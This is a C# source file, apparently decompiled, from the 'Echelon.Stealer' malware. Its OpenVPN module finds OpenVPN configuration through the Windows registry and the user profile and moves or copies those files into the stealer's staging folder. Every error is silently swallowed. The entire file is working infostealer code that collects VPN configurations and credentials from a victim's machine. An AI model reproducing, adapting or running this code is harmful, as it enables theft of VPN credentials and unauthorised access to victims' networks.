using System;
using System.IO;
using Echelon.Global;
using Microsoft.Win32;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000012 RID: 18
	internal class OpenVPN
	{
		// Token: 0x0600002E RID: 46 RVA: 0x00003CC8 File Offset: 0x00001EC8
		public static void GetOpenVPN(string Echelon_Dir)
		{
			try
			{
				RegistryKey localMachine = Registry.LocalMachine;
				string[] subKeyNames = localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					if (subKeyNames[i] == "OpenVPN")
					{
						Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
						try
						{
							new DirectoryInfo(localMachine.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString()).MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
							OpenVPN.count++;
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				string path = Help.UserProfile + "\\OpenVPN\\config\\conf\\";
				if (Directory.Exists(path))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
					{
						Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
						fileInfo.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + fileInfo.Name);
					}
					OpenVPN.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400002A RID: 42
		public static int count;
	}
}
